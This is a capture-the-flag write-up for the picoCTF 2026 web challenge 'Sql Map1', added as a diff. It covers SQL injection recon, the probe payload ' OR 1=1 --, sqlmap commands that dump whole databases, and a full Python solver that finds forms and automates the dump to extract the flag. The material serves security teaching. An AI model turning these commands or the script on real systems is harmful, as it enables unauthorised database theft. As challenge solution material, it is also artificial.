@@ -1,0 +1,417 @@
+---
+title: "Sql Map1 — picoCTF 2026"
+date: 2026-06-26
+author: "Ian Mattas"
+slug: "picoctf-2026-sql-map1"
+order: 65
+writeupKind: "challenge"
+ctfSlug: "picoctf-2026"
+ctfTitle: "picoCTF 2026"
+---
+
+# Sql Map1 — picoCTF 2026
+
+> **Category:** `Web Exploitation`  
+> **Difficulty:** Medium  
+> **Points:** 300  
+> **Author:** Imattas aka Zemi
+
+---
+
+## Challenge Description
+
+> You've been hired by a shadowy group of pentesters who love a good puzzle. The system looks ordinary, but appearances lie.
+
+---
+
+## Recon / Initial Analysis
+
+We are given a web application URL hosting what appears to be a standard login page or search interface backed by an SQL database. The challenge name is a direct hint: use **sqlmap** to automate discovery and exploitation of SQL injection vulnerabilities.
+
+The application has one or more user-input fields that are vulnerable to SQL injection. The name "Sql Map1" strongly hints that the intended solution path is to use `sqlmap`, the popular open-source SQL injection automation tool.
+
+### Reconnaissance
+
+1. **Identify the injection point.** Browse the application and identify forms or URL parameters that interact with the database. Common targets include login forms (`username`, `password` fields) and search/filter parameters in GET or POST requests.
+2. **Capture the request.** Use browser developer tools (Network tab) or Burp Suite to capture the exact HTTP request being sent when the form is submitted. Note the URL, method (GET/POST), parameters, and any cookies or headers required (especially session cookies).
+3. **Confirm SQL injection.** Manually test with a simple payload like `' OR 1=1 --` to confirm the parameter is injectable before unleashing sqlmap.
+
+---
+
+## Vulnerability / Observation
+
+One or more input fields are vulnerable to SQL injection. sqlmap automates the entire exploitation process:
+
+- **Detection:** It fingerprints the database type (SQLite, MySQL, PostgreSQL, etc.) and identifies the injection technique (UNION-based, blind boolean, blind time-based, error-based, stacked queries).
+- **Enumeration:** It lists databases, tables, and columns.
+- **Extraction:** It dumps table contents, which typically contain the flag.
+
+For picoCTF challenges, the backend is commonly **SQLite** and the flag is usually stored in a dedicated table (e.g., `flags`, `secrets`, or `more_table`).
+
+### Key sqlmap flags
+
+- `-u URL` -- target URL with the injectable parameter marked
+- `--data "param=value"` -- for POST requests
+- `--cookie "session=..."` -- include session cookies if required
+- `--forms` -- automatically detect and test forms on the page
+- `--dbs` -- enumerate databases
+- `--tables -D dbname` -- list tables in a database
+- `--dump -T tablename` -- dump all rows from a table
+- `--dump-all` -- dump everything
+- `--batch` -- non-interactive mode (accept defaults)
+- `--level 3 --risk 2` -- increase detection sensitivity
+
+---
+
+## Exploitation / Solution
+
+### Step 1: Identify the target
+
+Navigate to the challenge URL in a browser. Note the form fields and the URL structure.
+
+### Step 2: Run sqlmap against the target
+
+For a GET-based injection point:
+```bash
+sqlmap -u "http://<challenge-url>/search?query=test" --batch --dump-all
+```
+
+For a POST-based login form:
+```bash
+sqlmap -u "http://<challenge-url>/login" --data "username=admin&password=pass" --batch --dump-all
+```
+
+If the application requires a session cookie:
+```bash
+sqlmap -u "http://<challenge-url>/search?query=test" --cookie "session=<your-session-cookie>" --batch --dump-all
+```
+
+### Step 3: Let sqlmap enumerate and dump
+
+sqlmap will:
+1. Detect the injection type and DBMS
+2. Enumerate all tables
+3. Dump all table contents
+
+### Step 4: Find the flag
+
+Look through the dumped output for a value matching `picoCTF{...}`. It is typically in a table like `flags`, `secrets`, or `hidden`.
+
+### Alternative: Use --forms for automatic form detection
+
+```bash
+sqlmap -u "http://<challenge-url>/" --forms --batch --dump-all
+```
+
+This tells sqlmap to crawl the page, find all forms, and test each field automatically.
+
+---
+
+## Full Exploit Script
+
+```python
+#!/usr/bin/env python3
+"""
+Sql Map1 - picoCTF 2026
+Category: Web Exploitation | Points: 300
+
+Automated solver that uses sqlmap to exploit SQL injection and extract the flag.
+
+Usage:
+    python3 solve.py <challenge-url>
+
+Example:
+    python3 solve.py http://saturn.picoctf.net:12345
+
+Requirements:
+    - sqlmap must be installed (pip install sqlmap  OR  apt install sqlmap)
+    - requests (pip install requests)
+"""
+
+import argparse
+import os
+import re
+import subprocess
+import sys
+import tempfile
+
+try:
+    import requests
+except ImportError:
+    print("[!] 'requests' module not found. Install with: pip install requests")
+    sys.exit(1)
+
+
+def find_sqlmap():
+    """Locate sqlmap binary."""
+    # Check common locations
+    for cmd in ["sqlmap", "python3 -m sqlmap", "python -m sqlmap"]:
+        try:
+            result = subprocess.run(
+                cmd.split() + ["--version"],
+                capture_output=True, text=True, timeout=10
+            )
+            if result.returncode == 0:
+                return cmd.split()
+        except (FileNotFoundError, subprocess.TimeoutExpired):
+            continue
+
+    # Check if sqlmap.py exists in common paths
+    common_paths = [
+        "/usr/share/sqlmap/sqlmap.py",
+        "/usr/local/bin/sqlmap",
+        os.path.expanduser("~/sqlmap-dev/sqlmap.py"),
+        os.path.expanduser("~/tools/sqlmap/sqlmap.py"),
+    ]
+    for path in common_paths:
+        if os.path.isfile(path):
+            return ["python3", path]
+
+    return None
+
+
+def discover_endpoints(base_url):
+    """Try to discover injectable endpoints on the target."""
+    session = requests.Session()
+    endpoints = []
+
+    # Try common paths
+    paths_to_try = [
+        "/", "/login", "/search", "/index.php", "/index.html",
+        "/api/search", "/api/login", "/query", "/lookup",
+    ]
+
+    print(f"[*] Probing {base_url} for endpoints...")
+
+    for path in paths_to_try:
+        try:
+            url = base_url.rstrip("/") + path
+            resp = session.get(url, timeout=10, allow_redirects=True)
+            if resp.status_code == 200:
+                # Check for forms in the HTML
+                forms = re.findall(
+                    r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\']([^"\']*)["\']',
+                    resp.text, re.IGNORECASE
+                )
+                if forms:
+                    for action, method in forms:
+                        if not action.startswith("http"):
+                            action = base_url.rstrip("/") + "/" + action.lstrip("/")
+                        endpoints.append((action, method.upper()))
+                        print(f"    [+] Found form: {method.upper()} {action}")
+
+                # Check for input fields
+                inputs = re.findall(
+                    r'<input[^>]*name=["\']([^"\']*)["\']', resp.text, re.IGNORECASE
+                )
+                if inputs and not forms:
+                    endpoints.append((url, "GET"))
+                    print(f"    [+] Found inputs at: {url} -> {inputs}")
+
+                # Also check for query parameters in links
+                param_links = re.findall(r'href=["\']([^"\']*\?[^"\']*)["\']', resp.text)
+                for link in param_links:
+                    if not link.startswith("http"):
+                        link = base_url.rstrip("/") + "/" + link.lstrip("/")
+                    endpoints.append((link, "GET"))
+                    print(f"    [+] Found parameterized link: {link}")
+
+        except requests.RequestException:
+            continue
+
+    # Also store session cookies for sqlmap
+    cookies = session.cookies.get_dict()
+    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items()) if cookies else None
+
+    return endpoints, cookie_str
+
+
+def run_sqlmap(target_url, method="GET", data=None, cookie=None):
+    """Run sqlmap and capture output."""
+    sqlmap_cmd = find_sqlmap()
+    if not sqlmap_cmd:
+        print("[!] sqlmap not found! Please install it:")
+        print("    pip install sqlmap")
+        print("    OR: apt install sqlmap")
+        print("    OR: git clone https://github.com/sqlmapproject/sqlmap.git")
+        sys.exit(1)
+
+    # Create temp directory for sqlmap output
+    output_dir = tempfile.mkdtemp(prefix="sqlmap_picoctf_")
+
+    cmd = sqlmap_cmd + [
+        "-u", target_url,
+        "--batch",           # Non-interactive
+        "--dump-all",        # Dump everything
+        "--level", "3",      # Increase detection level
+        "--risk", "2",       # Moderate risk
+        "--threads", "4",    # Speed up
+        "--output-dir", output_dir,
+        "--flush-session",   # Fresh start
+    ]
+
+    if method == "POST" and data:
+        cmd.extend(["--data", data])
+
+    if cookie:
+        cmd.extend(["--cookie", cookie])
+
+    # If the URL doesn't have parameters, try --forms
+    if "?" not in target_url and method == "GET" and not data:
+        cmd.append("--forms")
+
+    print(f"\n[*] Running sqlmap...")
+    print(f"    Command: {' '.join(cmd)}\n")
+
+    try:
+        result = subprocess.run(
+            cmd,
+            capture_output=True,
+            text=True,
+            timeout=300  # 5 minute timeout
+        )
+        output = result.stdout + "\n" + result.stderr
+    except subprocess.TimeoutExpired:
+        print("[!] sqlmap timed out after 5 minutes")
+        output = ""
+
+    return output, output_dir
+
+
+def extract_flag(text):
+    """Search text for picoCTF flag pattern."""
+    flags = re.findall(r'picoCTF\{[^}]+\}', text)
+    return flags
+
+
+def search_sqlmap_output(output_dir):
+    """Search sqlmap output files for the flag."""
+    flags = []
+    for root, dirs, files in os.walk(output_dir):
+        for fname in files:
+            fpath = os.path.join(root, fname)
+            try:
+                with open(fpath, "r", errors="ignore") as f:
+                    content = f.read()
+                    found = extract_flag(content)
+                    if found:
+                        flags.extend(found)
+            except Exception:
+                continue
+    return flags
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Sql Map1 solver - picoCTF 2026"
+    )
+    parser.add_argument(
+        "url",
+        help="Challenge URL (e.g., http://saturn.picoctf.net:12345)"
+    )
+    parser.add_argument(
+        "--data",
+        help="POST data (e.g., 'username=admin&password=pass')",
+        default=None
+    )
+    parser.add_argument(
+        "--cookie",
+        help="Session cookie string",
+        default=None
+    )
+    parser.add_argument(
+        "--param",
+        help="Specific parameter to test (e.g., 'username')",
+        default=None
+    )
+    args = parser.parse_args()
+
+    base_url = args.url.rstrip("/")
+    print(f"[*] Sql Map1 Solver - picoCTF 2026")
+    print(f"[*] Target: {base_url}\n")
+
+    # Phase 1: Discover endpoints
+    endpoints, auto_cookie = discover_endpoints(base_url)
+    cookie = args.cookie or auto_cookie
+
+    # Phase 2: Run sqlmap
+    if args.data:
+        # User specified POST data
+        print(f"[*] Using provided POST data: {args.data}")
+        output, output_dir = run_sqlmap(base_url, "POST", args.data, cookie)
+    elif endpoints:
+        # Try discovered endpoints
+        for url, method in endpoints:
+            print(f"[*] Trying: {method} {url}")
+            data = None
+            if method == "POST":
+                # Build dummy POST data from form inputs
+                try:
+                    resp = requests.get(url, timeout=10)
+                    inputs = re.findall(
+                        r'<input[^>]*name=["\']([^"\']*)["\']',
+                        resp.text, re.IGNORECASE
+                    )
+                    data = "&".join(f"{inp}=test" for inp in inputs)
+                except Exception:
+                    data = "username=test&password=test"
+
+            output, output_dir = run_sqlmap(url, method, data, cookie)
+
+            # Check for flag in sqlmap output
+            flags = extract_flag(output)
+            if not flags:
+                flags = search_sqlmap_output(output_dir)
+
+            if flags:
+                print(f"\n{'='*60}")
+                print(f"[+] FLAG FOUND: {flags[0]}")
+                print(f"{'='*60}\n")
+                return
+
+            print(f"[-] No flag found with this endpoint, trying next...\n")
+    else:
+        # Fallback: run sqlmap with --forms on the base URL
+        print("[*] No specific endpoints found, using --forms mode")
+        output, output_dir = run_sqlmap(base_url, "GET", cookie=cookie)
+
+    # Final flag search
+    all_flags = extract_flag(output) if 'output' in dir() else []
+    if not all_flags and 'output_dir' in dir():
+        all_flags = search_sqlmap_output(output_dir)
+
+    if all_flags:
+        print(f"\n{'='*60}")
+        print(f"[+] FLAG FOUND: {all_flags[0]}")
+        print(f"{'='*60}\n")
+    else:
+        print("\n[-] Flag not found automatically.")
+        print("[*] Try running sqlmap manually with more specific parameters:")
+        print(f"    sqlmap -u \"{base_url}\" --forms --batch --dump-all --level 5 --risk 3")
+        print(f"\n[*] Or target a specific parameter:")
+        print(f"    sqlmap -u \"{base_url}/endpoint?param=test\" --batch --dump-all")
+        if 'output_dir' in dir():
+            print(f"\n[*] sqlmap output saved to: {output_dir}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## Key Takeaways
+
+- The challenge name itself is the hint: sqlmap is the intended tool for automating SQL injection discovery and exploitation.
+- Capture the exact request (method, parameters, cookies) before running sqlmap so it targets the right injection point.
+- `--batch --dump-all` runs non-interactively and dumps every table; `--level`/`--risk` raise detection sensitivity for stubborn injection points.
+- `--forms` lets sqlmap auto-detect and test forms when you don't know the parameter; `--cookie` carries session state.
+- picoCTF SQLi backends are often SQLite with the flag tucked in a dedicated table — scan the dump for the `picoCTF{...}` pattern.
+
+---
+
+## References
+
+- [sqlmap official site](https://sqlmap.org/)
+- [sqlmap usage wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
+- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
